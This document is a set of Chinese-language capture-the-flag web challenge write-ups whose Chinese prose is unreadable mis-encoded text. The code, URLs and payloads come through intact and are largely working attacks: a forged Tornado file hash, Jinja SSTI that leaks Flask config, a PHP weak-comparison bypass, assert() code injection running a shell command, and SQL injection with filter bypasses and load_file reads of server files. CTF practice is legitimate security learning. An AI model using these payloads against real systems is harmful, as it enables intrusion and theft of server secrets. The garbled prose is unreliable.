    {'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '300da6b0-b937-44a8-a3df-6a44a8660750'} 

è®¡ç®—filehashå€¼:

    import hashlib

    def md5(s):
        return hashlib.md5(s).hexdigest()

    def filehash():
        filename = b'/fllllllllllllag'
        cookie_secret = '300da6b0-b937-44a8-a3df-6a44a8660750'
        print(md5((cookie_secret+md5(filename)).encode('utf-8')))

    if __name__ == '__main__':
        filehash()

payloadï¼š

    http://220.249.52.133:49325/file?filename=/fllllllllllllag&filehash=2238c86521369cdb6ef6b58d15dc9433

æˆåŠŸè·å–flagã€‚

## shrine

æºç 

    import flask
    import os

    app = flask.Flask(__name__)
    app.config['FLAG'] = os.environ.pop('FLAG')

    @app.route('/')
    def index():
        return open(__file__).read()

    @app.route('/shrine/<path:shrine>')
    def shrine(shrine):

        def safe_jinja(s):
            s = s.replace('(', '').replace(')', '')
            blacklist = ['config', 'self']
            return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

        return flask.render_template_string(safe_jinja(shrine))

    if __name__ == '__main__':
        app.run(debug=True)

é¦–å…ˆåœ¨shrineè·¯å¾„ä¸‹æµ‹è¯•sstièƒ½æ­£å¸¸æ‰§è¡Œ

    http://220.249.52.133:31107/shrine/{{7*7}}

ä»£ç å®¡è®¡

    app.config['FLAG'] = os.environ.pop('FLAG')

æ³¨å†Œäº†ä¸€ä¸ªåä¸ºFLAGçš„configï¼ŒçŒœæµ‹è¿™å°±æ˜¯flagï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤å¯ä»¥ç›´æ¥{{config}}å³å¯æŸ¥çœ‹æ‰€æœ‰app.configå†…å®¹ï¼Œä½†æ˜¯è¿™é¢˜è®¾äº†é»‘åå•[â€˜configâ€™,â€˜selfâ€™]ï¼Œå¹¶ä¸”è¿‡æ»¤äº†æ‹¬å·

    return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s

ä¸Šé¢è¿™è¡Œä»£ç æŠŠé»‘åå•çš„ä¸œè¥¿éå†å¹¶è®¾ä¸ºç©ºï¼Œä¾‹å¦‚ï¼š

    http://220.249.52.133:31107/shrine/{{config}}

è¿”å›ç»“æœ

    None

ä¸è¿‡pythonè¿˜æœ‰ä¸€äº›å†…ç½®å‡½æ•°ï¼Œæ¯”å¦‚url_forå’Œget_flashed_messages

    http://220.249.52.133:31107/shrine/{{url_for.__globals__}}
    http://220.249.52.133:31107/shrine/{{get_flashed_messages.__globals__}}

çœ‹åˆ°current_appæ„æ€åº”è¯¥æ˜¯å½“å‰appï¼ŒæŸ¥çœ‹å½“å‰appä¸‹çš„configï¼Œå³payloadï¼š

    http://220.249.52.133:31107/shrine/{{url_for.__globals__['current_app'].config}}
    http://220.249.52.133:31107/shrine/{{get_flashed_messages.__globals__['current_app'].config}}


## lottery

è€ƒå¯Ÿ .gitæ³„éœ²ã€phpæºç å®¡è®¡ã€å¼±ç±»å‹åˆ©ç”¨

æ‰“å¼€é“¾æ¥å‘ç°æ˜¯ä¸€ä¸ªä¹°å½©ç¥¨çš„ç½‘ç«™ï¼Œä½†æ˜¯è¦ä¹°flagé’±ä¸å¤Ÿ

ä½¿ç”¨dirsearchçˆ†ç ´url 

    python dirsearch.py -u http://220.249.52.133:41417 -e *

å‘ç°Gitæ³„éœ²,å­˜åœ¨.gitæ–‡ä»¶å¤¹ï¼Œè¿™é‡Œä½¿ç”¨å·¥å…·GitHackï¼Œä¸‹è½½åœ°å€https://github.com/lijiejie/GitHack

æ‰“å¼€api.phpæ–‡ä»¶å‘ç°ï¼Œé‡Œé¢æœ‰ä¸€æ®µæ˜¯æŠ½å¥–çš„ä»£ç ï¼Œä¸»è¦æ˜¯é€šè¿‡è¾“å…¥çš„æ•°æ®å’Œè¿™é‡Œçš„éšæœºæ•°è¿›è¡Œæ¯”è¾ƒï¼Œçœ‹ç›¸ç­‰çš„æ•°å­—ï¼Œä¸­çš„é’±å°±è¶Šå¤§ï¼Œåº”ç”¨äº†å¼±æ¯”è¾ƒ==ï¼Œè¿™é‡Œæ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œå¯ä»¥ç”¨trueç»•è¿‡

![](https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/202085-43803.jpg)

    function buy($req){
        require_registered();
        require_min_money(2);

        $money = $_SESSION['money'];
        $numbers = $req['numbers'];
        $win_numbers = random_win_nums();
        $same_count = 0;
        for($i=0; $i<7; $i++){
            if($numbers[$i] == $win_numbers[$i]){
                $same_count++;
            }
        }
        switch ($same_count) {
            case 2:
                $prize = 5;
                break;
            case 3:
                $prize = 20;
                break;
            case 4:
                $prize = 300;
                break;
            case 5:
                $prize = 1800;
                break;
            case 6:
                $prize = 200000;
                break;
            case 7:
                $prize = 5000000;
                break;
            default:
                $prize = 0;
                break;
        }
        $money += $prize - 2;
        $_SESSION['money'] = $money;
        response(['status'=>'ok','numbers'=>$numbers, 'win_numbers'=>$win_numbers, 'money'=>$money, 'prize'=>$prize]);
    }

requestsæ˜¯jsonæ ¼å¼çš„,æ¯”è¾ƒå½©ç¥¨æ•°å­—ä¸ç”¨æˆ·æ•°å­—é‡‡ç”¨==å¼±æ¯”è¾ƒ,è€Œä¸”æ˜¯ä¸€ä½ä¸€ä½çš„æ¯”è¾ƒçš„,ç”±äº json æ”¯æŒå¸ƒå°”å‹æ•°æ®ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„é€ ä¸€ä¸²æ•°ç»„[true,true,true,true,true,true,true]ä¼ å…¥ï¼Œå› ä¸ºå¸ƒå°”å€¼trueå’Œä»»æ„å­—ç¬¦ä¸²éƒ½å¼±ç›¸ç­‰ã€‚

![](https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/202085-44034.jpg)

PHPå¼±ç±»å‹å°çŸ¥è¯† è¯¦ç»†å¯ä»¥å‚è€ƒ[php å¼±ç±»å‹æ€»ç»“](https://www.cnblogs.com/Mrsm1th/p/6745532.html)

    PHPæœ‰ä¸¤ç§æ¯”è¾ƒç¬¦å·==ä¸===

    === åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Œå†æ¯”è¾ƒ

    == åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒï¼Œå†æ¯”è¾ƒ


åœ¨è¾“å…¥æŠ½å¥–æ•°å­—é¡µé¢ï¼Œè¿›è¡ŒæŠ“åŒ…ï¼ŒæŠŠnumberçš„å€¼æ”¹æˆæ•°ç»„

    {"action":"buy","numbers":[true,true,true,true,true,true,true]}

å¤šgoå‡ ä¸‹é’±å˜å¤šï¼Œå°±å¯ä»¥ä¹°flagäº†

![](https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/202085-44631.jpg)

## mfw

ç”±Abouté¡µé¢ä¸­æç¤º Git/PHP/Bootstrap çŒœæµ‹å¯èƒ½æœ‰gitæ³„æ¼

åˆ©ç”¨dirsearchè·‘ä¸€ä¸‹ï¼Œæœç„¶å­˜åœ¨

githackä¸‹è½½æ³„æ¼æºç 

æŸ¥çœ‹index.phpæ–‡ä»¶å†…å®¹å¾—åˆ°PHPå…³é”®ä»£ç ï¼š

    <?php

    if (isset($_GET['page'])) {
        $page = $_GET['page'];
    } else {
        $page = "home";
    }

    $file = "templates/" . $page . ".php";

    // I heard '..' is dangerous!
    assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

    // TODO: Make this look nice
    assert("file_exists('$file')") or die("That file doesn't exist!");

    ?>
    
å‡ ä¸ªå‡½æ•°

    assert() æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º FALSEã€‚ assert()å‡½æ•°ä¼šå°†æ‹¬å·ä¸­çš„å­—ç¬¦å½“æˆä»£ç æ¥æ‰§è¡Œï¼Œå¹¶è¿”å›trueæˆ–falseã€‚

    strpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆ™è¿”å›Falseã€‚ä»£ç ä¸­ä¸å…è®¸è¾“å…¥çš„å­—ç¬¦ä¸­åŒ…å«è¿ç»­çš„ä¸¤ä¸ªç‚¹ï¼Œå¦åˆ™å°±è¿”å›é”™è¯¯ã€‚è¿™æ®µä»£ç ä¸­åªç”¨é»‘åå•è¿‡æ»¤äº†è¿ä¸ªç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³åŠæ³•ç»•è¿‡ã€‚

    file_exists() å‡½æ•°æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ã€‚

æ³¨å…¥å¤„

    $file = "templates/" . $page . ".php";
    assert("strpos('$file', '..') === false") or die("Detected hacking attempt!"); 
    assert("file_exists('$file')") or die("That file doesn't exist!"); 

åˆ©ç”¨assertç‰¹æ€§

    bool assert(mixed $assertion[,string $description])ï¼Œå¦‚æœassertionæ˜¯å­—ç¬¦ä¸²ï¼Œä»–ä¼šè¢«assert()å½“åšphpä»£ç æ‰§è¡Œã€‚ 
    æ€è·¯æ˜¯é€šè¿‡å¯æ§å˜é‡fileä¼ å…¥æ¶æ„å‚æ•°ï¼Œæ„é€ é—­åˆ file_exists(),ä½¿assert()æ‰§è¡Œæ¶æ„ä»£ç ã€‚

å¯¹strpos/file_existså‡½æ•°è¿›è¡Œé—­åˆï¼Œæ„é€ ä¸€ä¸‹

    ?page=') or phpinfo();//

    $file = "templates/') or phpinfo();//.php";
    assert("strpos('templates/') or phpinfo();//.php', '..') === false") or die("Detected hacking attempt!");
    assert("file_exists('templates/') or phpinfo();//.php')") or die("That file doesn't exist!"); 

æ„é€ payloadï¼Œä½¿ç”¨catæŸ¥çœ‹flag.phpçš„å†…å®¹ï¼ŒæŸ¥çœ‹ç½‘é¡µæºç æ‰èƒ½è·å–Flag

    ?page=') or system("cat templates/flag.php");//

    $file = "templates/') or system("cat templates/flag.php");//.php";
    assert("strpos('templates/') or system("cat templates/flag.php");//.php', '..') === false") or die("Detected hacking attempt!");
    assert("file_exists('templates/') or system("cat templates/flag.php");//.php") or die("That file doesn't exist!"); 

## web2

æŠŠç»™å‡ºçš„å­—ç¬¦ä¸²é€†å‘è§£å¯†å°±èƒ½å¾—åˆ°flag

ç®€å•å®¡è®¡ä¸€ä¸‹ä»£ç 

    <?php
    $miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";

    function encode($str){	
        $_o=strrev($str);  //åè½¬å­—ç¬¦ä¸²
        // echo $_o;
            
        for($_0=0;$_0<strlen($_o);$_0++){  //å¾ªç¯å­—ç¬¦ä¸²é•¿åº¦
        
            $_c=substr($_o,$_0,1);  //ä»$_0ä½ç½®å¼€å§‹ï¼Œè¿”å›1ä¸ªå­—ç¬¦

            $__=ord($_c)+1;  //è¿”å›å­—ç¬¦ä¸²é¦–ä¸ªå­—æ¯çš„ASCIIå€¼ + 1

            $_c=chr($__);  //è¿”å›æŒ‡å®šè¿›åˆ¶çš„ASCIIå€¼

            $_=$_.$_c;   //æ‹¼æ¥ä¸¤ä¸ªå˜é‡çš„å†…å®¹ èµ‹å€¼
        } 
        return str_rot13(strrev(base64_encode($_)));  //è¿”å›  ROT13 ç¼–ç /è§£ç (åè½¬å­—ç¬¦ä¸²(base64åŠ å¯†($_)))  çš„ç»“æœ
    }

    highlight_file(__FILE__);  //è¿”å›é«˜äº®ä»£ç 
    /*
    é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag
    */
    ?>  

PHPå†…ç½®å‡½æ•°

    strrev(string): åè½¬å­—ç¬¦ä¸²

    strlen(string): è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦

    substr(string, start, length): è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†
        string: æ‰€éœ€è¦çš„å­—ç¬¦ä¸²
        start: åœ¨å­—ç¬¦ä¸²ä½•å¤„å¼€å§‹
        length: å¯é€‰ã€‚è§„å®šè¢«è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚é»˜è®¤æ˜¯ç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾

    ord(string): è¿”å›å­—ç¬¦ä¸²é¦–ä¸ªå­—ç¬¦çš„ ASCII å€¼

    chr(): ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å¯¹åº”çš„å­—ç¬¦

    str_rot13(string): å¯¹å­—ç¬¦ä¸²æ‰§è¡Œ ROT13 ç¼–ç ã€‚ROT13 ç¼–ç æŠŠæ¯ä¸€ä¸ªå­—æ¯åœ¨å­—æ¯è¡¨ä¸­å‘å‰ç§»åŠ¨ 13 ä¸ªå­—æ¯ã€‚æ•°å­—å’Œéå­—æ¯å­—ç¬¦ä¿æŒä¸å˜ã€‚ç¼–ç å’Œè§£ç éƒ½æ˜¯ç”±è¯¥å‡½æ•°å®Œæˆçš„ã€‚å¦‚æœæŠŠå·²ç¼–ç çš„å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œé‚£ä¹ˆå°†è¿”å›åŸå§‹å­—ç¬¦ä¸²

    base64_encode(string): ä½¿ç”¨ MIME base64 å¯¹æ•°æ®è¿›è¡Œç¼–ç 

å†™å‡ºé€†å‘ä»£ç 

    <?php
    $str='a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws';
    $_ = base64_decode(strrev(str_rot13($str)));

    $_o=NULL;
    for($_0=0;$_0<strlen($_);$_0++){  

            $_c=substr($_,$_0,1);  

            $__=ord($_c)-1;  

            $_c=chr($__);  

            $_o=$_o.$_c;   
        } 


    echo strrev($_o);

    ?>

## fakebook

å‚è€ƒï¼šhttps://blog.csdn.net/qq_41500251/article/details/105383065?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-2-105383065.nonecase

æ‰«æç›®å½• dirsearch å¾¡å‰‘

å‘ç°éšè—çš„robots.txtå’Œflag.php

æŸ¥çœ‹flag.phpï¼Œä½†æ˜¯å“åº”å†…å®¹ä¸ºç©ºã€‚å¦‚æœæˆ‘ä»¬ç¡®å®šäº†ä¸€ä¸ªé¡µé¢å­˜åœ¨ï¼Œè®¿é—®åé¡µé¢å†…å®¹ä¸ºç©ºï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼Œè¦ä¹ˆé¡µé¢æœ¬èº«å°±æ²¡æœ‰å†…å®¹ã€‚å†æ¥å°±æ˜¯æ²¡æœ‰è®¿é—®æƒé™ï¼ŒæœåŠ¡å™¨ç¦æ­¢é€šè¿‡HTTPç›´æ¥è¯·æ±‚flag.phpæ–‡ä»¶ã€‚é‚£æ¥ä¸‹æ¥æˆ‘ä»¬æ‰€æœ‰çš„æ€è·¯å°±å¯ä»¥æ˜ç¡®ï¼Œå°±æ˜¯è¦æ‰¾ç³»ç»Ÿä¸­èƒ½å¤Ÿè®¿é—®flag.phpçš„å…¶ä»–æ–¹å¼ã€‚ï¼ˆSSRFï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼Œå…¨ç§°Server-Side Request Forgeryï¼Œæ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬é€šè¿‡æµè§ˆå™¨ç›´æ¥è®¿é—®flag.phpå†…å®¹å¹¶ä¸è¿”å›å†…å®¹ï¼Œè¿™ä¸ªè¯·æ±‚å¯¹äºæœåŠ¡å™¨æ¥è¯´æ˜¯å¤–éƒ¨è¯·æ±‚ã€‚å½“æ”»å‡»è€…å¯ä»¥é€šè¿‡SSRFè®©æœåŠ¡å™¨å†…éƒ¨åŠŸèƒ½è®¿é—®flagæ–‡ä»¶æ—¶ï¼Œè¿™ç§å¤–éƒ¨ç¦æ­¢è®¿é—®çš„é™åˆ¶ä¹Ÿå°±ä¼šç›¸åº”æ¶ˆå¤±ã€‚ï¼‰

å†æ¥çœ‹robots.txtï¼Œå…¶ä¸­æœ‰æºç æ³„æ¼ï¼ˆ/user.php.bakï¼‰ï¼Œè¾“å…¥åˆ°åœ°å€æ ï¼Œå¾—åˆ°æ–‡ä»¶user.php.bakã€‚

user.php.bakæºç ï¼š

    <?php

    class UserInfo
    {

        public $name = "";
        public $age = 0;
        public $blog = "";

        public function __construct($name, $age, $blog)
        {
            $this->name = $name;
            $this->age = (int)$age;
            $this->blog = $blog;
        }

        function get($url)
        {
            $ch = curl_init();                                   //åˆå§‹åŒ–ä¸€ä¸ªcurlä¼šè¯

            curl_setopt($ch, CURLOPT_URL, $url);                 //è®¾ç½®éœ€è¦æŠ“å–çš„URL
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);         //è®¾ç½®cURL å‚æ•°ï¼Œè¦æ±‚ç»“æœä¿å­˜åˆ°å­—ç¬¦ä¸²ä¸­è¿˜æ˜¯è¾“å‡ºåˆ°å±å¹•ä¸Š
            $output = curl_exec($ch);                            //è¿è¡ŒcURLï¼Œè¯·æ±‚ç½‘é¡µ
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            if($httpCode == 404) {
                return 404;
            }
            curl_close($ch);          //å…³é—­ä¸€ä¸ªcurlä¼šè¯ï¼Œå”¯ä¸€çš„å‚æ•°æ˜¯curl_init()å‡½æ•°è¿”å›çš„å¥æŸ„

            return $output;
        }

        public function getBlogContents ()
        {
            return $this->get($this->blog);
        }

        public function isValidBlog ()
        {
            $blog = $this->blog;
            return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
        }

    }

å®¡è®¡æºç 

æ˜¯ä¸€ä¸ªUserInfoç±»ï¼Œç±»å¯¹è±¡æœ‰ä¸‰ä¸ªå±æ€§ï¼šname,age,blogã€‚å…¶ä½™çš„éƒ¨åˆ†æœ‰ä¸¤ä¸ªå‡½æ•°ç‰¹æ®Šäº›ï¼Œä¸€ä¸ªgetï¼Œä¸€ä¸ªisValidBlogã€‚getæ–¹æ³•é€šè¿‡curlå‘é€è¯·æ±‚ï¼ˆcurlæ˜¯ä¸€ä¸ªåˆ©ç”¨urlè¯­æ³•å·¥ä½œçš„ä¼ è¾“å·¥å…·ï¼Œæ­¤ä¾‹ä¸­çš„ä½¿ç”¨ï¼Œå³è·å¾—æŒ‡å®šurlçš„é¡µé¢å†…å®¹ã€‚è¯¦ç»†å†…å®¹ï¼Œè¯·è‡ªè¡ŒæŸ¥é˜…è¡¥å……ï¼‰ï¼Œä¸”å¹¶æœªå¯¹å‚æ•°urlè¿›è¡Œè¿‡æ»¤ï¼Œè¿™ç§ä¸å¯¹ç”¨æˆ·å¯æ§å‚æ•°è¿‡æ»¤çš„ï¼Œæˆ‘ä»¬å°±è¦é‡ç‚¹å¯¹å¾…ä¸‹ã€‚isValidBlogå‡½æ•°æ˜¯å¯¹blogå‚æ•°è¿›è¡Œçš„æ­£åˆ™åŒ¹é…ï¼ŒçŒœæµ‹å¯¹ç”¨æˆ·çš„è¾“å…¥æ ¼å¼è¿›è¡Œäº†ä¸€å®šçš„é™åˆ¶ã€‚ï¼ˆgetBlogContentså‡½æ•°è°ƒç”¨äº†getå‡½æ•°ï¼ŒåŒæ ·éœ€è¦å…³æ³¨ã€‚ï¼‰

å‘ç°å…¶ä¸­Get()æ–¹æ³•å¹¶æ²¡æœ‰å¯¹è·å–è¿‡æ¥çš„urlè¿›è¡Œä»»ä½•çš„è¿‡æ»¤ï¼Œæ‰€ä»¥è¿™é‡Œå­˜åœ¨SSRF(æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ )æ¼æ´ã€‚

å¯¹äºæœ‰ç™»å½•ï¼Œæœ‰æ³¨å†Œçš„ä¾‹é¢˜ï¼Œæˆ‘ä»¬è¦ä¹ æƒ¯æ€§çš„å°è¯•ä¸‹å¼±å£ä»¤ã€‚ç»“æœå…¨éƒ¨å¼¹çª—æç¤ºâ€œlogin failedâ€ï¼Œæ¢æ³¨å†Œçª—å£ï¼Œæ³¨å†Œç™»å½•ã€‚æ•´ä¸ªé¡µé¢é™¤äº†è“è‰²ç”¨æˆ·åå¯ä»¥ç‚¹å‡»ä¹‹å¤–ï¼Œæ²¡ä»€ä¹ˆæœ‰ä»·å€¼çš„ä¸œè¥¿ã€‚

æŸ¥çœ‹ä¸‹æºç ä½ ä¼šå‘ç°ï¼Œæœ€ä¸‹é¢æ˜¯ä¸ªiframeã€‚iframeçš„å†…å®¹é€šè¿‡dataä¼ªåè®®è·å–ï¼Œæ­¤å¤„dataåè®®çš„ä½¿ç”¨æ ¼å¼ä¸ºï¼š

    data:text/html;base64,<base64ç¼–ç çš„HTMLä»£ç >

å¦‚æœæˆ‘ä»¬æƒ³åŠæ³•è®©dataåè®®åé¢æ¥ä¸Šflag.phpçš„å†…å®¹ï¼Œæ˜¯ä¸æ˜¯å°±èƒ½è¾¾åˆ°æ˜¾ç¤ºç›®çš„äº†ã€‚åŒæ—¶ä¹Ÿæ¥äº†ä¸¤ä¸ªé—®é¢˜ï¼šä¸€ï¼Œflagæ–‡ä»¶çš„è·¯å¾„å¹¶ä¸æ¸…æ¥šï¼Œé€šè¿‡æ‰«æï¼Œæˆ‘ä»¬åªæ™“å¾—å®ƒå’Œä¸»é¡µé¢åœ¨åŒä¸€ç›®å½•ä¸‹ã€‚äºŒã€å¦‚ä½•å°†å†…å®¹æ·»åŠ åˆ°dataåè®®åé¢ã€‚

    /view.php?no=1

æ•´ä¸ªé¡µé¢è¿˜å‰©ä¸€ä¸ªç‚¹ï¼Œå°±æ˜¯è¿™ä¸ªnoå‚æ•°ï¼šæŠŠå®ƒæ¢æˆ0æˆ–è€…æ¢æˆ2ï¼Œé¡µé¢è¿”å›å…¨éƒ¨æŠ¥é”™ã€‚ä½†è·å¾—äº†é‡è¦ä¿¡æ¯ï¼Œè·¯å¾„ã€‚ç¡®å®šä¸€ç‚¹flagæ–‡ä»¶è·¯å¾„ä¸ºï¼š/var/www/html/flag.phpã€‚

å­˜åœ¨sqlæ³¨å…¥

    /view.php?no=1 and 1=1 #

order by 4 # æ­£å¸¸æ˜¾ç¤ºï¼Œ order by 5 # é¡µé¢æŠ¥é”™ï¼Œåˆ¤æ–­æœ‰å››åˆ—

    /view.php?no=1 order by 4 #
    /view.php?no=1 order by 5 #

åˆ¤æ–­æ˜¾ç¤ºä½,è¿”å›no hack ~_~ï¼Œè¯´æ˜æœ‰è¿‡æ»¤

    /view.php?no=1 union select 1,2,3,4 #

ä½¿ç”¨å†…è”æ³¨é‡Šç»•è¿‡ã€‚union/**/selectç»•è¿‡ï¼Œå‘ç°usernameå¤„æ˜¾ç¤ºå‡ºæ¥äº†2ï¼Œå…¶ä½™åœ°æ–¹ä¸ºååºåˆ—åŒ–å¤±è´¥ã€‚

    /view.php?no=-6 union/**/select 1,2,3,4#

    Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31

æ‰€ä»¥å…ˆåœ¨usernameå¤„å°†æ•°æ®å¸¦å‡ºï¼Œå¾—åˆ°ç”¨æˆ·æ˜¯root@localhost ï¼Œdatabaseä¸ºfakebook

    /view.php?no=-6 union/**/select 1,user(),3,4#
    /view.php?no=-6 union/**/select 1,database(),3,4#

å…ˆæŠ›å¼€æ•°æ®åº“åfakebookä¸è¯´ï¼Œè¿™ä¸ªrootç”¨æˆ·ç€å®å“äº†ä¸€è·³ï¼Œæƒé™ä¹‹é«˜ï¼Œäº®çç‹—çœ¼ã€‚mysqlä¸­çš„load_fileå‡½æ•°ï¼Œå…è®¸è®¿é—®ç³»ç»Ÿæ–‡ä»¶ï¼Œå¹¶å°†å†…å®¹ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›ï¼Œä¸è¿‡éœ€è¦çš„æƒé™å¾ˆé«˜ï¼Œä¸”å‡½æ•°å‚æ•°è¦æ±‚æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚è¿™å·§äº†ä¸æ˜¯ï¼Œæ¡ä»¶å…¨éƒ½æœ‰ã€‚

payload:

    /view.php?no=-6/**/union/**/select 1,load_file("/var/www/html/flag.php"),3,4

æŸ¥çœ‹æºç è·å¾—flag

ä½†ä¼šå‘ç°ï¼Œå‰é¢æœé›†çš„å¥½å¤šç‚¹å…¨éƒ¨æ²¡ç”¨åˆ°ï¼Œå°¤å…¶æ˜¯é‚£ä¸ªä¸¥é‡å¯ç–‘çš„iframeï¼Œç»§ç»­å°è¯•æ³¨å…¥ã€‚

ä¸ç”¨load_fileï¼Œç»§ç»­æ³¨å…¥ä¸‹å»ã€‚ç°åœ¨å·²ç»æ‹¿åˆ°äº†æ•°æ®åº“åï¼šfakebookï¼Œæ¥ä¸‹æ¥æ‹¿è¡¨åï¼š

çˆ†è¡¨åï¼Œå¾—åˆ°è¡¨åä¸ºusers

    /view.php?no=-6 union/**/select 1,(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE TABLE_SCHEMA="fakebook"),3,4#

çˆ†åˆ—åï¼Œå¾—åˆ°åˆ—åä¸ºno,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS ã€‚æ˜æ˜¾noï¼Œusernameï¼Œpasswdä¸ºè´¦å·åŸºæœ¬ä¿¡æ¯ï¼Œåé¢æœ‰å‡ ä¸ªæœªçŸ¥å­—æ®µï¼ŒçŒœæµ‹æ˜¯ç³»ç»Ÿå˜é‡ã€‚

    /view.php?no=-6 union/**/select 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'users'),3,4#

æˆ‘ä»¬çŸ¥é“æœ€å¼€å§‹æ³¨å†Œçš„noä¸º1ï¼Œusernameå’Œpasswdä¹Ÿéƒ½çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œå”¯ç‹¬dataå­—æ®µçš„ä¿¡æ¯ä¸æ˜ç¡®ï¼Œæ‹¿å‡ºæ¥çœ‹çœ‹å§ã€‚

    /view.php?no=-6 union/**/select 1,group_concat(username,passwd,data),3,4 from users where no=1#

çˆ†å­—æ®µï¼Œç»“æœæ˜¯ä¸ªåºåˆ—åŒ–åçš„UserInfoå¯¹è±¡ï¼Œè¿™å’Œæˆ‘ä»¬æœ€å¼€å§‹å¾—åˆ°çš„é‚£ä¸ªå¤‡ä»½æ–‡ä»¶å¥‘åˆäº†ã€‚
    
    O:8:"UserInfo":3:{s:4:"name";s:9:"123123123";s:3:"age";i:12;s:4:"blog";s:20:"http://123123123.com";} 

æ¥ä¸‹æ¥çš„ä¸œè¥¿ï¼Œæˆ‘è®¤ä¸ºéœ€è¦çŒœã€‚æœ€å¼€å§‹æ—¶çš„ç”¨æˆ·é¡µé¢no=1æ—¶ï¼Œé¡µé¢è¿”å›ç”¨æˆ·çš„ç”¨æˆ·åã€å¯†ç ã€åšå®¢ä¹‹ç±»çš„æ¶ˆæ¯ã€‚æ¯«æ— ç–‘é—®ï¼Œé¡µé¢æ˜¯æ ¹æ®usersè¡¨ä¸­no=1çš„è¿™æ¡æ•°æ®ï¼Œæ¸²æŸ“çš„é¡µé¢ã€‚å› ä¸ºå›æ˜¾ï¼Œæˆ‘ä»¬åªè¯æ˜äº†æŸ¥è¯¢è¯­å¥çš„ç¬¬äºŒä¸ªå­—æ®µæ˜¯usernameã€‚å…¶ä½™ä¸‰ä¸ªå­—æ®µå¹¶ä¸æ˜ç¡®ï¼Œä½†æˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼Œåº”è¯¥å’Œæ•°æ®åº“è¡¨ä¸­çš„å­—æ®µé¡ºåºç›¸ä¼¼ã€‚ç¬¬å››ä¸ªå­—æ®µåº”è¯¥å°±æ˜¯dataï¼Œè€Œæˆ‘ä»¬ç°åœ¨æœ‰ä¸€ä¸ªç°æˆçš„dataæ•°æ®ï¼Œ

å¤§æ¦‚çš„æ€è·¯ä¸ºï¼Œæˆ‘ä»¬è¾“å…¥çš„ä¿¡æ¯è¢«ä¿å­˜ä¸ºåºåˆ—åŒ–ï¼Œè¯»å–çš„æ—¶å€™ä¼šä»æ•°æ®åº“ä¸­å–å‡ºå¹¶ååºåˆ—åŒ–ï¼Œç„¶åæ˜¾ç¤ºåœ¨blogç•Œé¢ã€‚ ã€

function get($url)è·å–çš„blogè¿æ¥ï¼Œå¦‚æœè¿æ¥å¤±è´¥å°±404ï¼Œå¦åˆ™è¯»å–æ–‡ä»¶ä¿¡æ¯ã€‚

æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ååºåˆ—åŒ–æ¥å®ç°ssrfè¯»å–ä»»æ„æ–‡ä»¶ï¼Œæ„é€ æˆ‘ä»¬æƒ³è¦çš„è·¯å¾„ï¼Œç„¶åä¸ºäº†ç»•è¿‡æ­£åˆ™ï¼Œä¸ä»æ³¨å†Œç™»å½•çš„åœ°æ–¹ä¸‹æ‰‹ï¼Œç›´æ¥äººä¸ºæ„é€ è”åˆæŸ¥è¯¢è¿”å›è¯­å¥ï¼Œdataå­—æ®µåœ¨ç¬¬å››ä¸ªä½ç½®ã€‚

